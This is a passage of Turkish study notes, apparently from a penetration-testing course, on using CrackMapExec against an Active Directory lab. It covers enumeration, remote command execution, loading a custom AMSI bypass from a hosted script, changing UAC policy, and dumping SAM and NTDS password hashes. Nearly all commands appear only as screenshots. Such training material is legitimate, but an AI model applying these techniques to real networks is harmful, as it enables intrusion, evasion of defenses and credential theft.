+Son olarak, CLEANUP=True seçeneği ile .searchConnector-ms dosyasını temizleyebiliriz:
+
+
+### searchConnector-ms Dosyalarını Temizleme
+![Pasted image 20241202202155.png](/img/user/resimler/Pasted%20image%2020241202202155.png)
+![Pasted image 20241202202201.png](/img/user/resimler/Pasted%20image%2020241202202201.png)
+
+LNK dosyaları genellikle bu tür saldırılar için bilinir. .searchConnector-ms gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+
+
+### SMB ile Eşleme ve Numaralandırma
+
+CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:
+
+![Pasted image 20241202202635.png](/img/user/resimler/Pasted%20image%2020241202202635.png)
+![Pasted image 20241202202649.png](/img/user/resimler/Pasted%20image%2020241202202649.png)
+
+Daha önce çalışmamış olanları gözden geçirelim:
+
+### Hedefteki etkin oturumları / oturum açmış kullanıcıları numaralandırma
+
+Birden fazla hedefi tehlikeye attıysak, etkin oturumları kontrol etmeye değer olabilir, belki bir domain yöneticisi vardır ve çabamızı bu belirli hedefe odaklamamız gerekir. Bir bilgisayardaki kullanıcıları tanımlamak için --sessions ve --loggedon-users seçeneklerini kullanabiliriz. Oturumlar, kullanıcı oturum açmamış olsa bile kullanıcı kimlik bilgilerinin hedef makinede kullanıldığı anlamına gelir. Oturum açmış kullanıcılar kendi kendini açıklar; bir kullanıcının hedef makinede oturum açtığı anlamına gelir. Bloodhound, aktif oturumları bulmak için kullanabileceğimiz başka bir araçtır.
+
+
+### Sessions ve loggendon-users seçeneklerini kullanma
+![Pasted image 20241202203026.png](/img/user/resimler/Pasted%20image%2020241202203026.png)
+
+Belirli bir kullanıcıyı arıyorsak, --loggedon-users-filter seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, regex'i de destekler.
+
+
+### Oturum açmış kullanıcılarla filtre seçeneğini kullanma
+![Pasted image 20241202203114.png](/img/user/resimler/Pasted%20image%2020241202203114.png)
+![Pasted image 20241202203120.png](/img/user/resimler/Pasted%20image%2020241202203120.png)
+
+
+### Enumerate Computers
+
+CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar
+
+
+### Domain'deki Bilgisayarları Numaralandırma
+![Pasted image 20241202203511.png](/img/user/resimler/Pasted%20image%2020241202203511.png)
+
+Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.
+
+
+### Enumerate LAPS
+
+Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, --laps seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya --sam gibi diğer seçenekleri kullanabiliriz.
+
+![Pasted image 20241202203817.png](/img/user/resimler/Pasted%20image%2020241202203817.png)
+
+![Pasted image 20241202203835.png](/img/user/resimler/Pasted%20image%2020241202203835.png)
+
+![Pasted image 20241202203857.png](/img/user/resimler/Pasted%20image%2020241202203857.png)
+
+Not: Varsayılan yönetici hesabı adı “administrator” değilse, kullanıcı adını --laps kullanıcı adı seçeneğinden sonra ekleyin.
+
+
+### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute
+
+Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için RID Bruteforce'dur. BloodHound veya PowerView ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in --rid-brute seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
+
+
+### List Local Users
+
+![Pasted image 20241202204115.png](/img/user/resimler/Pasted%20image%2020241202204115.png)
+![Pasted image 20241202204130.png](/img/user/resimler/Pasted%20image%2020241202204130.png)
+![Pasted image 20241202204141.png](/img/user/resimler/Pasted%20image%2020241202204141.png)
+![Pasted image 20241202204153.png](/img/user/resimler/Pasted%20image%2020241202204153.png)
+![Pasted image 20241202204200.png](/img/user/resimler/Pasted%20image%2020241202204200.png)
+
+Varsayılan olarak, --rid-brute 4000'e kadar RID'leri zorlayarak nesneleri numaralandırır. Davranışını --rid-brute [MAX_RID] kullanarak değiştirebiliriz.
+
+rid-brute seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory nesnelerini almak için kullanılabilir. NULL Authentication etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
+
+
+### Enumerate Disks
+
+Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir --disks seçeneğine sahiptir.
+
+### Enumerating Disks
+![Pasted image 20241202204448.png](/img/user/resimler/Pasted%20image%2020241202204448.png)
+
+
+### Local ve Domain Gruplarını Numaralandırma
+Local-groups ile local grupları veya --groups ile domain gruplarını listeleyebiliriz.
+
+### Enumerating Local Groups
+![Pasted image 20241202204607.png](/img/user/resimler/Pasted%20image%2020241202204607.png)
+![Pasted image 20241202204629.png](/img/user/resimler/Pasted%20image%2020241202204629.png)
+
+
+### Enumerating Domain Groups
+![Pasted image 20241202204749.png](/img/user/resimler/Pasted%20image%2020241202204749.png)
+![Pasted image 20241202204830.png](/img/user/resimler/Pasted%20image%2020241202204830.png)
+
+Eğer grup üyelerini almak istiyorsak, --groups [GRUP ADI] kullanabiliriz.
+
+
+### Group **Members**
+![Pasted image 20241202204931.png](/img/user/resimler/Pasted%20image%2020241202204931.png)
+
+Not: Yazım sırasında --local-group yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
+
+
+### Querying WMI
+[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde yönetimsel işlemler için kullanılır. Remote bilgisayarlardaki yönetim görevlerini otomatikleştirmek için WMI komut dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
+
+Windows Yönetim Araçları'nın (WMI) birincil kullanım alanlarından biri, sınıf ve örnek bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm nesneleri döndürmesini isteyebiliriz.
+
+WMI, TCP port 135 ve bir dizi dinamik port kullanır: 49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri), TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+
+Örneğin, remote bir bilgisayarda Sysmon uygulamasının çalışıp çalışmadığını sorgulamak ve Caption ve ProcessId'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%' şeklindedir:
+
+
+### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma
+![Pasted image 20241202210123.png](/img/user/resimler/Pasted%20image%2020241202210123.png)
+
+WMI, sınıflarını hiyerarşik bir ad alanında düzenler. Bir sorgu gerçekleştirmek için, Class Name (Sınıf Adı) ve içinde bulunduğu Namespace'i (Ad Alanı) bilmemiz gerekir. Yukarıdaki örnekte, root\cimv2 namespace'indeki Win32_Process sınıfını sorgulayın. Namespace belirtmedik çünkü varsayılan olarak CME root\cimv2 kullanır (bu bilgiyi --help menüsünde görebiliriz)
+
+Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, root\WMI namespace'inde bulunan MSPower_DeviceEnable sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
+
+
+### Quering root\WMI Namespace
+![Pasted image 20241202212300.png](/img/user/resimler/Pasted%20image%2020241202212300.png)
+![Pasted image 20241202212343.png](/img/user/resimler/Pasted%20image%2020241202212343.png)
+
+Not: Genellikle, WMI'yı sorgulamak için yönetici ayrıcalıklarına sahip olmamız gerekir, ancak bir yönetici, WMI'yı sorgulamak için yönetici olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için yönetici olmayan bir hesap kullanabiliriz.
+
+WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için Microsoft'un Belgelerini okuyabiliriz.
+
+Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.
+
+
+### LDAP and RDP Enumeration
+Daha önce, CrackMapExec'te en çok kullanılan protokol olan SMB ile bazı numaralandırma seçeneklerini inceledik, ancak LDAP ve RDP protokolleri ile daha fazla numaralandırma seçeneği vardır
+
+Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir
+
+
+### LDAP & RDP Commands
+LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:
+![Pasted image 20241202225531.png](/img/user/resimler/Pasted%20image%2020241202225531.png)
+![Pasted image 20241202225542.png](/img/user/resimler/Pasted%20image%2020241202225542.png)
+
+Henüz çalışmadıklarımızı gözden geçirelim.
+
+
+### Enumerating Users and Groups
+
+SMB protokolünde yaptığımız gibi, LDAP ile de kullanıcıları ve grupları listeleyebiliriz:
+
+### Enumerating Users and Groups
+
+![Pasted image 20241202225710.png](/img/user/resimler/Pasted%20image%2020241202225710.png)
+![Pasted image 20241202225721.png](/img/user/resimler/Pasted%20image%2020241202225721.png)
+![Pasted image 20241202225733.png](/img/user/resimler/Pasted%20image%2020241202225733.png)
+![Pasted image 20241202225743.png](/img/user/resimler/Pasted%20image%2020241202225743.png)
+
+Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi /etc/hosts dosyasında yapılandırmamız gerekir
+
+
+### İlginç Hesap Özelliklerini Numaralandırma
+
+ldap protokolü, PASSWD_NOTREQD veya TRUSTED_FOR_DELEGATION bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta adminCount değeri 1 olan tüm hesapları sorgulayabiliriz.
+
+PASSWD_NOTREQD hesap denetimi özniteliği ayarlanmışsa, kullanıcı geçerli parola ilkesi uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir ( domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için --password-notrequired seçeneğini kullanabiliriz.
+
+
+### PASSWD_NOTREQD Özniteliğinin Tanımlanması
+
+![Pasted image 20241202230116.png](/img/user/resimler/Pasted%20image%2020241202230116.png)
+![Pasted image 20241202230124.png](/img/user/resimler/Pasted%20image%2020241202230124.png)
+
+TRUSTED_FOR_DELEGATION özniteliği ayarlanırsa, bir hizmetin altında çalıştığı hizmet hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani hizmeti talep eden bir istemciyi taklit edebilir. Bu saldırı türüne Kerberos Unconstrained Delegation adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
+
+### Kısıtlamasız Delegasyonun Belirlenmesi
+![Pasted image 20241202230729.png](/img/user/resimler/Pasted%20image%2020241202230729.png)
+
+adminCount özniteliği, SDProp işleminin bir kullanıcıyı koruyup korumadığını belirler. Bu işlemde, Active Directory'deki AdminSDHolder, korunan kullanıcı hesaplarının ACL izinleri için bir şablon görevi görür. Herhangi bir ACE hesabı değiştirilirse (örneğin, bir saldırgan tarafından), bu işlem tarafından korunan hesapların ACL izinleri, SDProp işlemi her çalıştığında şablon izin kümesine sıfırlanır; bu varsayılan olarak her 60 dakikada bir yapılır ancak değiştirilebilir. Değer 0 olarak ayarlanmışsa veya belirtilmemişse kullanıcı kapsam dışıdır. Öznitelik değeri 1 olarak ayarlanırsa kullanıcı korunur. Saldırganlar genellikle dahili bir ortamda hedef almak için adminCount özniteliği 1 olarak ayarlanmış hesapları ararlar. Bunlar genellikle ayrıcalıklı hesaplardır ve daha fazla erişime veya domain'in tamamen ele geçirilmesine yol açabilir.
+
+
+### adminCount Özniteliğini Sorgulama
+![Pasted image 20241202230901.png](/img/user/resimler/Pasted%20image%2020241202230901.png)
+![Pasted image 20241202230911.png](/img/user/resimler/Pasted%20image%2020241202230911.png)
+![Pasted image 20241202230921.png](/img/user/resimler/Pasted%20image%2020241202230921.png)
+
+
+### Domain SID'sini numaralandırma
+
+Bazı domain saldırıları, kullanıcı veya domain SID'si gibi belirli domain bilgilerini edinmemizi gerektirir. SID (Security IDentifier), bir bilgisayarın veya domain controller'ın sizi tanımlamak için kullandığı benzersiz bir kimlik numarasıdır. Domain sid, domain'i tanımlayan benzersiz bir kimlik numarasıdır. CrackMapExec kullanarak domain sid'sini almak için --get-sid bayrağını kullanabiliriz:
+
+
+### Gathering the Domain SID
+
+![Pasted image 20241202231106.png](/img/user/resimler/Pasted%20image%2020241202231106.png)
+![Pasted image 20241202231112.png](/img/user/resimler/Pasted%20image%2020241202231112.png)
+
+
+### Group Managed Service Accounts (gMSA)
+
+Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:
+
+* Otomatik parola yönetimi.
+* Basitleştirilmiş service principal name (SPN) yönetimi.
+* Yönetimi diğer yöneticilere devretme yeteneği
+
+Bu yönetilen hizmet hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
+
+Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.
+
+Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):
+
+
+### Enumerating Accounts with gMSA Privileges
+![Pasted image 20241202231402.png](/img/user/resimler/Pasted%20image%2020241202231402.png)
+![Pasted image 20241202231409.png](/img/user/resimler/Pasted%20image%2020241202231409.png)
+
+Yukarıdaki örnekte, engels kullanıcısının PrincipalsAllowedToRetrieveManagedPassword ayrıcalığına sahip olduğunu görebiliriz, bu da svc_inlaneadm$ gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın NTLM parola hash'ini almak için --gmsa seçeneğini kullanabiliriz.
+
+
+### gMSA Parolasını Edinme
+![Pasted image 20241202231528.png](/img/user/resimler/Pasted%20image%2020241202231528.png)
+
+Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.
+
+
+### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme
+![Pasted image 20241202231553.png](/img/user/resimler/Pasted%20image%2020241202231553.png)
+![Pasted image 20241202231601.png](/img/user/resimler/Pasted%20image%2020241202231601.png)
+
+
+### RDP Screenshots
+RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca NLA ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için --nlascreenshot seçeneğini kullanabiliriz
+
+
+### Enumerate Login Prompt
+![Pasted image 20241202231656.png](/img/user/resimler/Pasted%20image%2020241202231656.png)
+
+Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.
+
+
+### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
+![Pasted image 20241202231729.png](/img/user/resimler/Pasted%20image%2020241202231729.png)
+![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)
+
+Eğer bir kullanıcı adı ve parolamız varsa, --screenshot seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek --screentime ile birleştirilebilir, varsayılan olarak 10, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
+
+Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen --res seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek 1024x768 olarak ayarlanmıştır
+
+
+
+### Taking a Screenshot
+![Pasted image 20241202232439.png](/img/user/resimler/Pasted%20image%2020241202232439.png)
+![Pasted image 20241202232444.png](/img/user/resimler/Pasted%20image%2020241202232444.png)
+
+
+Not: --screentime ve --res isteğe bağlı bayraklardır.
+
+Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:
+
+
+### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
+![Pasted image 20241202232517.png](/img/user/resimler/Pasted%20image%2020241202232517.png)
+![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)
+
+
+Bu bölümde, hedeflerimizi arşivlemeye yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini araştırdık. Bir sonraki bölümde CrackMapExec kullanarak komutların nasıl çalıştırılacağı incelenecektir.
+
+
+
+
+
+### Command Execution
+
+Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce UAC'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca RID 500'e sahip yönetici hesabı (varsayılan yönetici) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
+
+![Pasted image 20241203095807.png](/img/user/resimler/Pasted%20image%2020241203095807.png)
+
+Varsayılan olarak, LocalAccountTokenFilterPolicy değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) yönetim görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si 500 ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm yönetici hesapları yönetim görevlerini yürütebilir.
+
+Yöneticinin yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) uzaktan yönetim görevlerini yerine getirmesini engellemektir. Bu, FilterAdministratorToken kayıt defteri değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (uzaktan yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
+
+
+
+### Command Execution as Administrator
+Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için -x seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
+
+
+### Bir Komutu Administrator Olarak Çalıştırma
+![Pasted image 20241203100035.png](/img/user/resimler/Pasted%20image%2020241203100035.png)
+![Pasted image 20241203100045.png](/img/user/resimler/Pasted%20image%2020241203100045.png)
+
+
+### RID 500 Dışı Hesap Olarak Komut Yürütme
+Yukarıdaki komutta, localadmin local user Administrators grubundadır, ancak uzak komutu çalıştıramaz:
+
+### Komutu localadmin olarak çalıştırma
+![Pasted image 20241203100238.png](/img/user/resimler/Pasted%20image%2020241203100238.png)
+
+Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap yönetici olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, LocalAccountTokenFilterPolicy'yi 1 olarak ayarlayabiliriz.
+
+
+### LocalAccountTokenFilterPolicy'yi Değiştirme
+![Pasted image 20241203100321.png](/img/user/resimler/Pasted%20image%2020241203100321.png)
+
+![Pasted image 20241203100458.png](/img/user/resimler/Pasted%20image%2020241203100458.png)
+
+
+### Domain Hesabı Olarak Komut Yürütme
+LocalAccountTokenFilterPolicy yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve administrators grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, INLANEFREIGHT\robert hesabı administrators grubunun bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
+
+
+### Komutu Robert olarak çalıştır
+![Pasted image 20241203100627.png](/img/user/resimler/Pasted%20image%2020241203100627.png)
+
+
+### SMB ile Komut Yürütme
+CME'nin dört (4) farklı komut yürütme yöntemi vardır:
+![Pasted image 20241203101103.png](/img/user/resimler/Pasted%20image%2020241203101103.png)
+
+Not: Tüm yöntemler tüm bilgisayarlarda çalışmayabilir.
+
+Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:
+
+![Pasted image 20241203101142.png](/img/user/resimler/Pasted%20image%2020241203101142.png)
+
+CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin --exec-method bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
+
+
+### SMBExec Yöntemi ile Komut Yürütme
+![Pasted image 20241203101223.png](/img/user/resimler/Pasted%20image%2020241203101223.png)
+
+Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:
+
+
+### wmiexec aracılığıyla PowerShell Komut Yürütme
+![Pasted image 20241203101403.png](/img/user/resimler/Pasted%20image%2020241203101403.png)
+![Pasted image 20241203101435.png](/img/user/resimler/Pasted%20image%2020241203101435.png)
+
+PowerShell seçeneği -X çalıştırıldığında, perde arkasında CrackMapExec aşağıdakileri yapacaktır:
+
+12. AMSI baypas
+13. Payload'u gizleyin
+14. Payload'u çalıştırın
+
+### Özel AMSI Bypass Çalıştırma
+
+Bu teknikler PowerShell çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, --amsi-bypass seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:
+
+15. “Değiştirilmiş Amsi ScanBuffer Yaması” içeren dosyayı indirin
+
+
+### “Değiştirilmiş Amsi ScanBuffer Yaması” ile Bir Dosya Oluşturun
+![Pasted image 20241203101828.png](/img/user/resimler/Pasted%20image%2020241203101828.png)
+Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır
+
+### Komut Maksimum Uzunluğu Aşıyor
+![Pasted image 20241203102011.png](/img/user/resimler/Pasted%20image%2020241203102011.png)
+![Pasted image 20241203102018.png](/img/user/resimler/Pasted%20image%2020241203102018.png)
+
+16. Bu sorunu çözmek için, shantanukhande-amsi.ps1 dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.
+
+### PowerShell Komut Dosyasını Oluşturma ve Barındırma
+![Pasted image 20241203102127.png](/img/user/resimler/Pasted%20image%2020241203102127.png)
+
+Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.
+
+Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:
+
+
+### PowerShell Özel AMSI Bypass Kullanma
+![Pasted image 20241203102312.png](/img/user/resimler/Pasted%20image%2020241203102312.png)
+![Pasted image 20241203102346.png](/img/user/resimler/Pasted%20image%2020241203102346.png)
+
+
+### WinRM Kullanarak Komut Yürütme
+WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port 5985 ve HTTPS TCP port 5986'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için yönetici olmasını gerektirmemesidir. Administrators grubunun üyesiysek, Remote Management Users grubunun üyesiysek veya oturum yapılandırmasında açık PowerShell Remoting izinlerimiz varsa WinRM protokolünü kullanabiliriz.
+
+
+### Command Execution using WinRM
+![Pasted image 20241203102455.png](/img/user/resimler/Pasted%20image%2020241203102455.png)
+![Pasted image 20241203102501.png](/img/user/resimler/Pasted%20image%2020241203102501.png)
+
+
+
+### WinRM aracılığıyla PowerShell Komut Yürütme
+![Pasted image 20241203102608.png](/img/user/resimler/Pasted%20image%2020241203102608.png)
+
+
+### Other PowerShell Options
+
+WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:
+
+![Pasted image 20241203102901.png](/img/user/resimler/Pasted%20image%2020241203102901.png)
+
+Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.
+
+
+### SSH Command Execution
+CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.
+
+### Command Execution with SSH
+![Pasted image 20241203103019.png](/img/user/resimler/Pasted%20image%2020241203103019.png)
+![Pasted image 20241203103028.png](/img/user/resimler/Pasted%20image%2020241203103028.png)
+![Pasted image 20241203103033.png](/img/user/resimler/Pasted%20image%2020241203103033.png)
+
+Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da public ve private anahtarları kullanmaktır. CrackMapExec, --key-file seçeneği ile private key kullanımını destekler. Anahtarın çalışması için OPENSSH formatında olması gerekir.
+
+
+### Private Key Kullanarak SSH ile Komut Yürütme
+![Pasted image 20241203103449.png](/img/user/resimler/Pasted%20image%2020241203103449.png)
+
+Not: Herhangi bir parola yapılandırılmamışsa, -p seçeneğini boş (“”) olarak ayarlamalıyız, aksi takdirde bir hata alırız
+
+Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.
+
+
+### Gizli Bilgileri Bulma ve Kullanma
+Parola çıkarma söz konusu olduğunda CrackMapExec çok güçlüdür. On workstation'ı tehlikeye attığımızı ve hepsinden kimlik bilgilerini almak için LSASS işleminin belleğini boşaltmak istediğimizi düşünün; CrackMapExec bunu yapabilir.
+
+Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dökmek için donatıldığı yöntemleri keşfedeceğiz.
+
+
+### SAM
+SAM veritabanı tüm local kullanıcıların kimlik bilgilerini içerir ve birçok yönetici local kimlik bilgilerini birden fazla makinede tekrar kullandığından bunları almak çok önemlidir. SMB ve WinRM protokollerinde bulunan -- sam seçeneğini kullanarak SAM veritabanının içeriğini hızlı bir şekilde alabiliriz.
+
+
+### Dumping SAM
+![Pasted image 20241203104055.png](/img/user/resimler/Pasted%20image%2020241203104055.png)
+![Pasted image 20241203104100.png](/img/user/resimler/Pasted%20image%2020241203104100.png)
+
+
+### NTDS Active Directory Database
+
+Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı nesneleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için tersine çevrilebilir şifreleme etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
+
+https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption
+
+Hash'leri dump etmek için --ntds seçeneğini kullanmamız gerekir, aşağıdaki örnekte robert kullanıcısı bir Domain Admin değildir, ancak replikasyon gerçekleştirme ayrıcalıklarına sahiptir.
+
+Not: Aşağıdaki alıştırmalar proxy zincirlerini kullanır. Proxy zincirlerinin nasıl kurulacağı hakkında bilgi için CME ile Proxy Zincirleri bölümüne bakın.
+
+
+### Domain Controller'dan NTDS veritabanını boşaltma
+![Pasted image 20241203104633.png](/img/user/resimler/Pasted%20image%2020241203104633.png)
+![Pasted image 20241203104643.png](/img/user/resimler/Pasted%20image%2020241203104643.png)
+![Pasted image 20241203104652.png](/img/user/resimler/Pasted%20image%2020241203104652.png)
+![Pasted image 20241203104711.png](/img/user/resimler/Pasted%20image%2020241203104711.png)
+![Pasted image 20241203104720.png](/img/user/resimler/Pasted%20image%2020241203104720.png)
+![Pasted image 20241203104725.png](/img/user/resimler/Pasted%20image%2020241203104725.png)
+
